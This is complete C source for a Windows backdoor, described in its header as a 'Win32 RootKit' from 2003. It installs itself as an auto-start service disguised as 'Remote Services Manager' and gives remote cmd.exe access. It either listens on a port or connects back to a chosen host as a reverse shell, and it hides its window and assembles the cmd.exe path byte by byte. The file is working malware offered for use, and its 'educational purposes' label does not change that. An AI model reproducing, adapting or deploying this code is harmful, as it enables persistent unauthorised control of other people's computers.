/*
 * Win32 RootKit - cmd.exe remote shell backdoor
 * (c) 2003 Christophe Devine <devine@cr0.net>
 * Distributed for educational purposes only!
 *
 * Before running ntbindshell.exe, rename it to
 * "rsmss.exe" and copy it into %windir%\system32.
 * This program will automatically register itself
 * as a system service the first time it is run,
 * provided it has the required privileges.
 *
 * To remove the service, start Regedit and delete
 * HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\
 * Services\RSMSS, then reboot the computer.
 *
 * Backdoor usage:
 *
 *   normal (listen) mode: rsmss <port>
 *   reverse-connect mode: rsmss <port> <host>
 */

#include <winsock2.h>
#include <windows.h>
#include <string.h>

#define DEFAULT_PORT 26103

char ServiceName[] = "RSMSS";
char DisplayName[] = "Remote Services Manager";

int argc;
char *argv[8];

void WINAPI Handler( DWORD fdwControl )
{
    if( fdwControl == SERVICE_CONTROL_SHUTDOWN )
    {
        ExitProcess( 0 );
    }
}

void WINAPI ServiceMain( DWORD dwArgc, LPTSTR *lpszArgv )
{
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;
    SERVICE_STATUS_HANDLE sth;
    SERVICE_STATUS status;
    WSADATA WSAData;

    unsigned char buffer[4096];
    struct hostent *client_host;
    struct sockaddr_in server_addr;
    struct sockaddr_in client_addr;
    int server_sock, client_sock, n;
    unsigned short int port;

    sth = RegisterServiceCtrlHandler( ServiceName, Handler );

    memset( &status, 0, sizeof( SERVICE_STATUS ) );

    status.dwServiceType        = SERVICE_WIN32_OWN_PROCESS;
    status.dwCurrentState       = SERVICE_RUNNING;
    status.dwControlsAccepted   = SERVICE_ACCEPT_SHUTDOWN;
    status.dwWin32ExitCode      = NO_ERROR;

    SetServiceStatus( sth, &status );

    port = DEFAULT_PORT;

    if( argc > 1 )
    {
        if( ! ( port = atoi( argv[1] ) ) )
        {
            port = DEFAULT_PORT;
        }
    }

    if( WSAStartup( MAKEWORD(2,0), &WSAData ) )
    {
        return;
    }

    if( argc < 3 )
    {
        if( ! ( server_sock = WSASocket( AF_INET, SOCK_STREAM,
                    IPPROTO_IP, NULL, 0, 0 ) ) )
        {
            return;
        }

        n = sizeof( server_addr );

        memset( &server_addr, 0, n );

        server_addr.sin_addr.s_addr = htonl( INADDR_ANY );
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons( port );

        if( ( bind ( server_sock, (const struct sockaddr *)
                     &server_addr, n ) ) )
        {
            return;
        }

        if( listen( server_sock, 10 ) )
        {
            return;
        }
    }

    while( 1 )
    {
        n = sizeof( client_addr );

        if( argc < 3 )
        {
            if( ! ( client_sock = accept( server_sock,
                        (struct sockaddr *) &client_addr, &n ) ) )
            {
                continue;
            }
        }
        else
        {
            Sleep( 10000 );

            if( ! ( client_host = gethostbyname( argv[2] ) ) )
            {
                continue;
            }

            memset( &client_addr, 0, n );

            memcpy( (void *) &client_addr.sin_addr,
                    (void *) client_host->h_addr,
                    client_host->h_length );

            client_addr.sin_family = AF_INET;
            client_addr.sin_port   = htons( port );

            if( ! ( client_sock = WSASocket( AF_INET, SOCK_STREAM,
                        IPPROTO_IP, NULL, 0, 0 ) ) )
            {
                continue;
            }

            if( connect( client_sock, (struct sockaddr *)
                         &client_addr, n ) )
            {
                continue;
            }
        }

        GetStartupInfo( &sinfo );

        sinfo.dwFlags       = STARTF_USESTDHANDLES
                            | STARTF_USESHOWWINDOW;
        sinfo.wShowWindow   = SW_HIDE;
        sinfo.hStdInput     = (void *) client_sock;
        sinfo.hStdOutput    = (void *) client_sock;
        sinfo.hStdError     = (void *) client_sock;

        GetSystemDirectory( buffer, MAX_PATH );

        n = strlen( buffer );

        buffer[n    ] = '\\'; buffer[n + 5] = 'e';
        buffer[n + 1] = 'c';  buffer[n + 6] = 'x';
        buffer[n + 2] = 'm';  buffer[n + 7] = 'e';
        buffer[n + 3] = 'd';  buffer[n + 8] = '\0';
        buffer[n + 4] = '.';

        SetCurrentDirectory( "\\" );

        if( ! CreateProcess( buffer, NULL, NULL, NULL, TRUE,
            CREATE_NEW_CONSOLE, NULL, NULL, &sinfo, &pinfo ) )
        {
            shutdown( client_sock, 2 );
            continue;
        }

        closesocket( client_sock );
    }
}

int WINAPI WinMain( HINSTANCE hInstance,
                    HINSTANCE hPrevInstance,
                    LPSTR lpCmdLine, int nCmdShow )
{
    SC_HANDLE sc1, sc2;

    SERVICE_TABLE_ENTRY ste[2] =
    {
        { ServiceName, ServiceMain },
        { NULL, NULL }
    };

    unsigned char *c = GetCommandLine();

    if( sc1 = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS ) )
    {
        if( sc2 = OpenService( sc1, ServiceName, SERVICE_START ) )
        {
            CloseServiceHandle( sc2 );
        }
        else
        {
            if( GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST )
            {
                sc2 = CreateService(
                        sc1, ServiceName, DisplayName,
                        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
                        SERVICE_AUTO_START, SERVICE_ERROR_IGNORE,
                        c, NULL, NULL, NULL, NULL, NULL );

                if( sc2 != NULL )
                {
                    StartService( sc2, 0, NULL );
                    CloseServiceHandle( sc2 );
                    CloseServiceHandle( sc1 );
                    return( 0 );
                }
            }
        }

        CloseServiceHandle( sc1 );
    }

    argc = 0;

    while( 1 )
    {
        while( isspace( *c ) ) c++;

        if( *c == '\0' ) break;

        argv[argc++] = c;

        if( *c++ == '"' )
        {
            while( *c != '"' )
                if( *c++ == '\0' )
                    goto argv_done;
            c++;
        }
        else
        {
            while( ! isspace( *c ) )
                if( *c++ == '\0' )
                    goto argv_done;
        }

        *c++ = '\0';
    }

argv_done:

    if( ! StartServiceCtrlDispatcher( ste ) )
    {
        ServiceMain( 0, NULL );
    }

    return( 1 );
}
